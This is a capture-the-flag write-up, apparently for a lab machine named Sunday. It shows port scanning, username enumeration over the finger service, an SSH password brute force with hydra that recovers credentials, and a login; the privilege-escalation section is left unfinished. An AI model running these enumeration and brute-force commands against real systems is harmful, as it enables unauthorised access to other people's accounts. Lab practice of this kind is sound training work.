# Sunday

**Machine ip:** 10.10.10.76

## Enumeration
First thing first, start port scan:
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.76 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.76`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ecfe88ee-793c-489d-aafa-44cfb78c700b)

+ The result shows that 5 TCP ports are open:
```
Port 79: finger?
Port 111: rpcbind 2-4
Port 515: printer
Port 6787: http
Port 22022: OpenSSH 8.4
```

+ Start off with enumerating port 79, and it is **finger** service.
+ Finger protocol is used to find out information about users on a remote system. It can be used to enumerate usernames.
+ It provides status reports on logged in users. It can also provide details about a specific user and when they last logged in and from where.

+ Check if there are any logged in users: `finger @10.10.10.76`
+ Noone is currently logged in.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a7cb9456-0efe-461d-b5a0-06af81b664e7)

+ finger can also check for details on a specific user.
+ Check if the user **root** exists: `finger root@10.10.10.76`
+ root users exists.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/245a1dcb-ff9c-4e48-9706-f602366fd3e9)

+ Enumerate for more usernames using `/usr/share/seclists/Usernames/Names/names.txt` seclists wordlist.
+ Try to brute force usernames using the [finger-user-enum.pl](http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz) script from pentestmonkey.
+ `./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/92b5af15-f73d-4323-9989-46b8f3d740b0)

+ Check the results of finger for a username whether it exists.
+ `finger sammy@10.10.10.76`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f7f3fe42-1dc8-40e4-81fa-270c90771f3a)

+ `finger sunny@10.10.10.76`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a850e194-3edd-4c87-ae0d-cfa64c342f0a)

+ **sammy** and **sunny** users exist, and **test** user doesn't exist.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/edfc743d-7113-4830-94f0-979bf6bbd8b6)


## Gaining Access:
+ SSH is open, and there are 2 valid usernames: sammy adn sunny
+ Brute force the users' credentials using hydra.
```
hydra -L users.txt -P /usr/share/seclists/Passwords/probable-v2-top1575.txt 10.10.10.76 ssh -s 22022 -f
```

+ `sunny`:`sunday` username and password found.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3056ebf9-733d-4644-a26c-b91a787cab77)

+ Login ssh: `ssh -p 22022 sunny@10.10.10.76`
+ We got the low level access.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/75521922-5eea-4e98-8c9a-b44f26b5bd71)


## Privilege Escalation:
+ We need to escalate our privileges to Sammy.
  

# References & Alternatives:
+ https://vvmlist.github.io/#poison
+ 
